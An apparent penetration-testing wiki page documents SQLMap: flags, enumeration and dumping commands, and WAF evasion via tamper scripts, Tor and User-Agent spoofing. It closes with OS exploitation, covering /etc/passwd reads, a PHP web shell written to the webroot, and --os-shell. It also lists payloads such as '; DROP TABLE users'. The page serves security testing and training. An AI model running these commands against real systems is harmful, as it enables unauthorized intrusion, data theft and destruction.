---
title: "SQLMap"
category: "tools"
tags: []
excerpt: "SQLMap is a free, open-source penetration testing tool written in Python that automates detection and exploitation of..."
date: "2026-06-22"
---

---
## Overview
SQLMap is a free, open-source penetration testing tool written in Python that automates detection and exploitation of SQL injection vulnerabilities. It handles detection, fingerprinting, enumeration, data extraction, and — given sufficient privileges — OS-level exploitation including file read/write and interactive shell access. Supports 30+ DBMSes including MySQL, PostgreSQL, MSSQL, Oracle, SQLite, and MariaDB. See [SQL Injection](/techniques/SQL-Injection) for technique context on the underlying attack types.

## Target / Context
Web applications with SQL injection vulnerabilities in GET/POST parameters, cookies, headers, or JSON/XML request bodies. Pairs with [Burp Suite](/tools/Web-Testing/Burp-Suite/Burp-Suite) to capture and replay complex authenticated requests.

---
## Installation

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Installation Commands:</span></summary>
<div class="callout-body">

<ul class="callout-list">
  <li><code>sudo apt install sqlmap</code></li>
</ul>

Manual install:
<ul class="callout-list">
  <li><code>git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev</code></li>
  <li><code>python sqlmap.py</code></li>
</ul>

</div>
</details>

---
## Basic Usage

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Basic Usage:</span></summary>
<div class="callout-body">

<ul class="callout-list">
  <li><code>sqlmap -u "http://target.com/page?id=1" --batch</code></li>
</ul>
<code>sqlmap -h</code>    — basic help
<code>sqlmap -hh</code>   — full advanced help listing all options
<ul class="callout-list">
  <li><code>sqlmap --wizard</code></li>
</ul>

</div>
</details>

---
## Flags & Options

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Flags & Options:</span></summary>
<div class="callout-body">

| Flag | Description | Example |
|------|-------------|---------|
| <code>-u</code> / <code>--url</code> | Target URL | <code>-u "http://target.com/page?id=1"</code> |
| <code>-r</code> | Read full HTTP request from file | <code>-r req.txt</code> |
| <code>--data</code> | POST body data | <code>--data 'uid=1&name=test'</code> |
| <code>-p</code> | Specific parameter to test | <code>-p uid</code> |
| <code>--cookie</code> | Supply cookie header | <code>--cookie='PHPSESSID=abc123'</code> |
| <code>-H</code> / <code>--header</code> | Set custom header | <code>-H 'X-Forwarded-For: 127.0.0.1'</code> |
| <code>--random-agent</code> | Random User-Agent string | <code>--random-agent</code> |
| <code>--mobile</code> | Imitate smartphone browser | <code>--mobile</code> |
| <code>--method</code> | Override HTTP method | <code>--method=PUT</code> |
| <code>--batch</code> | Non-interactive mode; accept defaults | <code>--batch</code> |
| <code>--dbs</code> | Enumerate all databases | <code>--dbs</code> |
| <code>-D</code> | Target database | <code>-D testdb</code> |
| <code>--tables</code> | List tables in database | <code>--tables -D testdb</code> |
| <code>-T</code> | Target table | <code>-T users</code> |
| <code>-C</code> | Target specific columns | <code>-C name,surname</code> |
| <code>--dump</code> | Dump table records | <code>--dump -T users -D testdb</code> |
| <code>--dump-all</code> | Dump all databases | <code>--dump-all --exclude-sysdbs</code> |
| <code>--dump-format</code> | Output format (HTML or SQLite) | <code>--dump-format=HTML</code> |
| <code>--start</code> / <code>--stop</code> | Row range to dump by ordinal | <code>--start=2 --stop=3</code> |
| <code>--where</code> | WHERE condition filter on dump | <code>--where="name LIKE 'f%'"</code> |
| <code>--exclude-sysdbs</code> | Skip system databases | <code>--exclude-sysdbs</code> |
| <code>--schema</code> | Dump full DB schema | <code>--schema</code> |
| <code>--search</code> | Search table/column names by keyword | <code>--search -T user</code> |
| <code>--banner</code> | Get DBMS version banner | <code>--banner</code> |
| <code>--current-user</code> | Get current DB user | <code>--current-user</code> |
| <code>--current-db</code> | Get current database name | <code>--current-db</code> |
| <code>--is-dba</code> | Check if current user has DBA privileges | <code>--is-dba</code> |
| <code>--passwords</code> | Dump and crack DB user passwords | <code>--passwords --batch</code> |
| <code>--all</code> | Full enumeration of everything accessible | <code>--all --batch</code> |
| <code>--level</code> | Scan depth 1–5 (default 1) | <code>--level=5</code> |
| <code>--risk</code> | Risk level 1–3 (default 1); 3 enables OR payloads | <code>--risk=3</code> |
| <code>--technique</code> | Limit to specific injection types (BEUSTQ) | <code>--technique=BEU</code> |
| <code>--prefix</code> | Static prefix to wrap injection vector | <code>--prefix="%'))"</code> |
| <code>--suffix</code> | Static suffix to wrap injection vector | <code>--suffix="-- -"</code> |
| <code>--union-cols</code> | Force exact column count for UNION injection | <code>--union-cols=3</code> |
| <code>--union-char</code> | Override NULL fill value in UNION | <code>--union-char='a'</code> |
| <code>--union-from</code> | Append FROM clause to UNION query | <code>--union-from=dual</code> |
| <code>--no-cast</code> | Disable CAST() wrapping on retrieved data | <code>--no-cast</code> |
| <code>--code</code> | HTTP code that signals TRUE response | <code>--code=200</code> |
| <code>--titles</code> | Detect TRUE/FALSE via <code><title></code> tag comparison | <code>--titles</code> |
| <code>--string</code> | String present in TRUE response only | <code>--string=success</code> |
| <code>--text-only</code> | Strip HTML; compare visible text only | <code>--text-only</code> |
| <code>--parse-errors</code> | Display DBMS errors inline during run | <code>--parse-errors</code> |
| <code>-t</code> | Save full traffic to output file | <code>-t traffic.txt</code> |
| <code>-v</code> | Verbosity level 0–6 (3 shows payloads) | <code>-v 3</code> |
| <code>--proxy</code> | Route all traffic through a proxy | <code>--proxy="http://127.0.0.1:8080"</code> |
| <code>--proxy-file</code> | Cycle through a list of proxies | <code>--proxy-file=proxies.txt</code> |
| <code>--tor</code> | Use Tor SOCKS proxy (port 9050/9150) | <code>--tor</code> |
| <code>--check-tor</code> | Verify Tor is reachable before running | <code>--check-tor</code> |
| <code>--csrf-token</code> | Anti-CSRF token parameter name | <code>--csrf-token="csrf_token"</code> |
| <code>--randomize</code> | Randomize value of a parameter each request | <code>--randomize=rp</code> |
| <code>--eval</code> | Evaluate Python expression before each request | <code>--eval="import hashlib; h=hashlib.md5(id).hexdigest()"</code> |
| <code>--tamper</code> | Apply tamper script(s) | <code>--tamper=between,randomcase</code> |
| <code>--list-tampers</code> | List all available tamper scripts | <code>--list-tampers</code> |
| <code>--skip-waf</code> | Skip WAF identification (reduce noise) | <code>--skip-waf</code> |
| <code>--chunked</code> | Split POST body into transfer-encoding chunks | <code>--chunked</code> |
| <code>--crawl</code> | Crawl site to discover injection points | <code>--crawl=2</code> |
| <code>--forms</code> | Automatically parse and test forms | <code>--forms</code> |
| <code>-g</code> | Use Google dork to find targets | <code>-g "inurl:id="</code> |
| <code>--file-read</code> | Read a file from the server filesystem | <code>--file-read "/etc/passwd"</code> |
| <code>--file-write</code> | Local file to write to the server | <code>--file-write shell.php</code> |
| <code>--file-dest</code> | Destination path on the server | <code>--file-dest "/var/www/html/shell.php"</code> |
| <code>--os-shell</code> | Attempt interactive OS shell via SQLi | <code>--os-shell</code> |

</div>
</details>

---
## Common Use Cases

### GET-based Testing
Supply a URL with a GET parameter. SQLMap tests injection points automatically and reports which type succeeded.

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
<div class="callout-body">

<ul class="callout-list">
  <li><code>sqlmap -u "http://target.com/page?id=1" --batch</code></li>
  <li><code>sqlmap -u "http://target.com/page?id=1" --batch --dbs</code></li>
  <li><code>sqlmap -u "http://target.com/page?id=1" -D testdb --tables</code></li>
  <li><code>sqlmap -u "http://target.com/page?id=1" -D testdb -T users --dump</code></li>
</ul>

</div>
</details>

### POST-based Testing
Use `--data` for inline POST bodies, or mark the injectable parameter with `*` to restrict testing to that field.

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
<div class="callout-body">

<ul class="callout-list">
  <li><code>sqlmap 'http://target.com/' --data 'uid=1&name=test' --batch</code></li>
</ul>
<code>sqlmap 'http://target.com/' --data 'uid=1*&name=test' --batch</code>   — asterisk targets uid only

</div>
</details>

### Full HTTP Request File
Use `-r` for complex requests with many headers, session cookies, or long bodies. Capture from Burp (Save Item) or browser DevTools (Copy → Copy Request Headers). Mark the injectable parameter inside the file with `*`.

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
<div class="callout-body">

<ul class="callout-list">
  <li><code>sqlmap -r req.txt --batch</code></li>
  <li><code>sqlmap -r req.txt --batch --dbs</code></li>
  <li><code>sqlmap -r req.txt -D mydb -T users --dump</code></li>
</ul>

To pin the injection point inside the file:
<ul class="callout-list">
  <li><code>GET /?id=1* HTTP/1.1</code></li>
</ul>

</div>
</details>

### cURL-converted Request
In browser DevTools → Network tab, right-click a request → Copy as cURL. Replace `curl` with `sqlmap` and append flags.

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
<div class="callout-body">

<ul class="callout-list">
  <li><code>sqlmap 'http://target.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Connection: keep-alive' --batch</code></li>
</ul>

</div>
</details>

### JSON / XML Body Testing
SQLMap automatically recognises JSON and XML-formatted POST bodies. No special flag needed — pass via `-r` or `--data` and mark the injectable field with `*` if auto-detection fails.

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
<div class="callout-body">

<ul class="callout-list">
  <li><code>sqlmap -r json_req.txt --batch</code></li>
</ul>

</div>
</details>

### Basic DB Enumeration
Run these together after detection to profile the database before dumping data.

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
<div class="callout-body">

<ul class="callout-list">
  <li><code>sqlmap -u "http://target.com/?id=1" --banner --current-user --current-db --is-dba --batch</code></li>
</ul>

</div>
</details>

### Table and Row Enumeration
Limit output by specifying columns or row ordinals — critical for large tables.

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
<div class="callout-body">

<ul class="callout-list">
  <li><code>sqlmap -u "http://target.com/?id=1" --tables -D testdb</code></li>
  <li><code>sqlmap -u "http://target.com/?id=1" --dump -T users -D testdb</code></li>
  <li><code>sqlmap -u "http://target.com/?id=1" --dump -T users -D testdb -C name,surname</code></li>
  <li><code>sqlmap -u "http://target.com/?id=1" --dump -T users -D testdb --start=2 --stop=3</code></li>
  <li><code>sqlmap -u "http://target.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"</code></li>
</ul>

</div>
</details>

### Schema and Search
Retrieve the full database structure, or search for tables and columns by keyword across all databases.

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
<div class="callout-body">

<ul class="callout-list">
  <li><code>sqlmap -u "http://target.com/?id=1" --schema</code></li>
</ul>
<code>sqlmap -u "http://target.com/?id=1" --search -T user</code>    — all tables containing "user"
<code>sqlmap -u "http://target.com/?id=1" --search -C pass</code>    — all columns containing "pass"

</div>
</details>

### Password Enumeration and Cracking
SQLMap automatically attempts dictionary-based cracking (31 hash algorithms, 1.4M entries) when it encounters password hashes during a dump. `--passwords` targets DB-level user credential tables. `--all` combined with `--batch` retrieves everything accessible without prompts — useful for coverage but output must be reviewed manually.

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
<div class="callout-body">

<ul class="callout-list">
  <li><code>sqlmap -u "http://target.com/?id=1" --dump -D master -T users --batch</code></li>
  <li><code>sqlmap -u "http://target.com/?id=1" --passwords --batch</code></li>
  <li><code>sqlmap -u "http://target.com/?id=1" --all --batch</code></li>
</ul>

</div>
</details>

---
## Injection Type Detection Reference
SQLMap reports detected injection types using `BEUSTQ` notation in its output. See [SQL Injection](/techniques/SQL-Injection) for full details on each type.

| Code | Type | Example Payload |
|------|------|-----------------|
| `B` | Boolean-based blind | `AND 1=1` |
| `E` | Error-based | `AND GTID_SUBSET(@@version,0)` |
| `U` | UNION query-based | `UNION ALL SELECT 1,@@version,3` |
| `S` | Stacked queries | `; DROP TABLE users` |
| `T` | Time-based blind | `AND 1=IF(2>1,SLEEP(5),0)` |
| `Q` | Inline queries | `SELECT (SELECT @@version) from` |

---
## Attack Tuning

### Level and Risk
Default run tests 72 payloads. Level 5 + Risk 3 expands to 7,865 — only use when the default run fails or the target requires OR-based payloads (e.g., login forms). Risk 3 enables OR payloads, which can cause data loss on writable SQL statements, so use carefully.

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
<div class="callout-body">

<ul class="callout-list">
  <li><code>sqlmap -u "http://target.com/?id=1" --level=5 --risk=3 --batch</code></li>
</ul>
<code>sqlmap -u "http://target.com/?id=1" --level=5 --risk=3 -v 3 --batch</code>   — -v 3 shows [PAYLOAD] lines

</div>
</details>

### Prefix and Suffix
Use when the vulnerable query wraps the parameter in characters that break standard boundary detection. The prefix/suffix enclose every vector payload.

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
<div class="callout-body">

<ul class="callout-list">
  <li><code>sqlmap -u "http://target.com/?q=test" --prefix="%'))" --suffix="-- -" --batch</code></li>
</ul>

Example: target query is <code>WHERE id LIKE (('</code> + input + <code>'))</code> — prefix closes the brackets, suffix comments the rest out.

</div>
</details>

### Technique Selection
Force specific injection type(s) to skip slow or disruptive techniques.

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
<div class="callout-body">

<code>sqlmap -u "http://target.com/?id=1" --technique=BEU --batch</code>   — skip time-based and stacked
<code>sqlmap -u "http://target.com/?id=1" --technique=E --batch</code>     — error-based only

</div>
</details>

### UNION Tuning
Provide column count, fill character, or a required FROM appendix when SQLMap fails UNION detection automatically.

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
<div class="callout-body">

<ul class="callout-list">
  <li><code>sqlmap -u "http://target.com/?id=1" --union-cols=3 --batch</code></li>
  <li><code>sqlmap -u "http://target.com/?id=1" --union-char='a' --batch</code></li>
</ul>
<code>sqlmap -u "http://target.com/?id=1" --union-from=dual --batch</code>   — required on Oracle

</div>
</details>

### Response Differentiation
When TRUE/FALSE responses differ only subtly, pin detection to a specific signal rather than full response comparison.

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
<div class="callout-body">

<code>sqlmap -u "http://target.com/?id=1" --code=200 --batch</code>          — HTTP 200 = TRUE
<code>sqlmap -u "http://target.com/?id=1" --titles --batch</code>            — compare <title> tags
<code>sqlmap -u "http://target.com/?id=1" --string="Welcome" --batch</code>  — string present in TRUE only
<code>sqlmap -u "http://target.com/?id=1" --text-only --batch</code>         — strip all HTML tags

</div>
</details>

---
## Bypassing Web Application Protections

### Anti-CSRF Token Bypass
SQLMap re-fetches the target page before each request to parse a fresh token value. Specify the token parameter name via `--csrf-token`.

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
<div class="callout-body">

<ul class="callout-list">
  <li><code>sqlmap -r req.txt --csrf-token="csrf_token" --batch</code></li>
</ul>

</div>
</details>

### Unique Value Bypass
Some apps require a unique parameter per request to detect and block automation. `--randomize` generates a new random value for that parameter on every request.

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
<div class="callout-body">

<ul class="callout-list">
  <li><code>sqlmap -u "http://target.com/?id=1&rp=29125" --randomize=rp --batch -v 5</code></li>
</ul>

</div>
</details>

### Calculated Parameter Bypass
When one parameter must be a computed hash of another (e.g., `h=MD5(id)`), use `--eval` to run Python code before each request to set the correct value.

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
<div class="callout-body">

<ul class="callout-list">
  <li><code>sqlmap -u "http://target.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch</code></li>
</ul>

</div>
</details>

### IP Concealment
Route through a proxy or Tor to hide source IP or bypass IP blacklists. Proxy lists are cycled sequentially.

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
<div class="callout-body">

<ul class="callout-list">
  <li><code>sqlmap -u "http://target.com/?id=1" --proxy="socks4://<proxy-ip>:<port>" --batch</code></li>
  <li><code>sqlmap -u "http://target.com/?id=1" --proxy-file=proxies.txt --batch</code></li>
  <li><code>sqlmap -u "http://target.com/?id=1" --tor --check-tor --batch</code></li>
</ul>

</div>
</details>

### User-Agent Blacklist Bypass
The default SQLMap User-Agent (`sqlmap/1.4.9`) is on most WAF block lists. Always use `--random-agent` if encountering immediate 5XX errors.

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
<div class="callout-body">

<ul class="callout-list">
  <li><code>sqlmap -u "http://target.com/?id=1" --random-agent --batch</code></li>
</ul>

</div>
</details>

### WAF Detection and Bypass
SQLMap auto-identifies WAFs using the identYwaf library (80+ signatures). Use `--skip-waf` to suppress this step and reduce fingerprinting noise on the wire.

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
<div class="callout-body">

<ul class="callout-list">
  <li><code>sqlmap -u "http://target.com/?id=1" --skip-waf --batch</code></li>
</ul>

</div>
</details>

### Tamper Scripts
Python scripts that transform payloads in-flight to evade WAF/IPS signatures. Chain multiple with commas; SQLMap applies them in predefined priority order.

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
<div class="callout-body">

<ul class="callout-list">
  <li><code>sqlmap -u "http://target.com/?id=1" --tamper=between,randomcase --batch</code></li>
</ul>
<code>sqlmap --list-tampers</code>   — full list with descriptions

</div>
</details>

#### Notable Tamper Scripts
| Tamper Script | Description |
|---|---|
| `0eunion` | Replaces `UNION` with `e0UNION` |
| `base64encode` | Base64-encodes the entire payload |
| `between` | Replaces `>` with `NOT BETWEEN 0 AND #` and `=` with `BETWEEN # AND #` |
| `commalesslimit` | Replaces `LIMIT M, N` with `LIMIT N OFFSET M` (MySQL) |
| `equaltolike` | Replaces all `=` with `LIKE` |
| `halfversionedmorekeywords` | Adds versioned comment before each keyword (MySQL) |
| `modsecurityversioned` | Wraps full query in versioned comment (MySQL) |
| `modsecurityzeroversioned` | Wraps full query in zero-versioned comment (MySQL) |
| `percentage` | Adds `%` before each character — `SELECT` becomes `%S%E%L%E%C%T` |
| `plus2concat` | Replaces `+` with `CONCAT()` (MSSQL) |
| `randomcase` | Randomizes keyword casing — `SELECT` becomes `SEleCt` |
| `space2comment` | Replaces spaces with `/**/` |
| `space2dash` | Replaces spaces with `--<random>\n` |
| `space2hash` | Replaces spaces with `#<random>\n` (MySQL) |
| `space2mssqlblank` | Replaces spaces with random blank chars (MSSQL) |
| `space2plus` | Replaces spaces with `+` |
| `space2randomblank` | Replaces spaces with random blank characters |
| `symboliclogical` | Replaces `AND`/`OR` with `&&`/`\|\|` |
| `versionedkeywords` | Wraps non-function keywords in versioned comments (MySQL) |
| `versionedmorekeywords` | Wraps all keywords in versioned comments (MySQL) |

### Chunked Transfer Encoding
Splits the POST request body into chunks so blacklisted SQL keywords straddle chunk boundaries and are not matched by pattern-based WAFs.

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
<div class="callout-body">

<ul class="callout-list">
  <li><code>sqlmap -u "http://target.com/?id=1" --data 'uid=1' --chunked --batch</code></li>
</ul>

</div>
</details>

### HTTP Parameter Pollution (HPP)
Splits the payload across duplicate parameter names. Target platforms like ASP/IIS concatenate them server-side, reconstructing the full payload after inspection.

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Example:</span></summary>
<div class="callout-body">

<ul class="callout-list">
  <li><code>?id=1&id=UNION&id=SELECT&id=username,password&id=FROM&id=users</code></li>
</ul>

</div>
</details>

---
## Error Handling and Debugging

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
<div class="callout-body">

<code>sqlmap -u "http://target.com/?id=1" --parse-errors --batch</code>              — show DBMS errors inline
<code>sqlmap -u "http://target.com/?id=1" -t traffic.txt --batch</code>              — save raw traffic to file
<code>sqlmap -u "http://target.com/?id=1" -v 3 --batch</code>                        — show payloads in output
<code>sqlmap -u "http://target.com/?id=1" -v 6 --batch</code>                        — maximum verbosity
<code>sqlmap -u "http://target.com/?id=1" --proxy="http://127.0.0.1:8080" --batch</code>  — route through Burp

</div>
</details>

---
## OS Exploitation

Requires DBA privileges or the `FILE` privilege (MySQL). File reads are more commonly available; file writes require `secure-file-priv` to be disabled and write permission on the target directory.

### File Read
Reads a server-side file via the SQL injection vulnerability and saves it to the local SQLMap output directory.

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
<div class="callout-body">

<ul class="callout-list">
  <li><code>sqlmap -u "http://target.com/?id=1" --is-dba --batch</code></li>
  <li><code>sqlmap -u "http://target.com/?id=1" --file-read "/etc/passwd" --batch</code></li>
</ul>
Output saved to: <code>~/.sqlmap/output/<host>/files/_etc_passwd</code>

</div>
</details>

### File Write / Web Shell Upload
Writes a local file to a path on the server. Most commonly used to plant a PHP web shell for code execution.

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
<div class="callout-body">

<ul class="callout-list">
  <li><code>echo '<?php system($_GET["cmd"]); ?>' > shell.php</code></li>
  <li><code>sqlmap -u "http://target.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php" --batch</code></li>
  <li><code>curl http://target.com/shell.php?cmd=id</code></li>
</ul>

</div>
</details>

### OS Shell
Attempts to establish an interactive OS shell using the best available method — web shell write, UDF (User-Defined Function), or `xp_cmdshell` on MSSQL. If UNION technique fails, fall back to error-based.

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
<div class="callout-body">

<ul class="callout-list">
  <li><code>sqlmap -u "http://target.com/?id=1" --os-shell --batch</code></li>
</ul>
<code>sqlmap -u "http://target.com/?id=1" --os-shell --technique=E --batch</code>   — force error-based

</div>
</details>

---
## Related Concepts
- [SQL Fundamentals](/knowledge/Web-Security/SQL-Fundamentals)
- [OWASP Top 10 - 2021](/knowledge/Web-Security/OWASP-Top-10---2021)

## Related Techniques
- [SQL Injection](/techniques/SQL-Injection)

## Related Playbooks
- [Linux Pentest Playbook](/playbooks/Linux-Pentest-Playbook)

---
## References / Images
- https://github.com/sqlmapproject/sqlmap/wiki/Usage
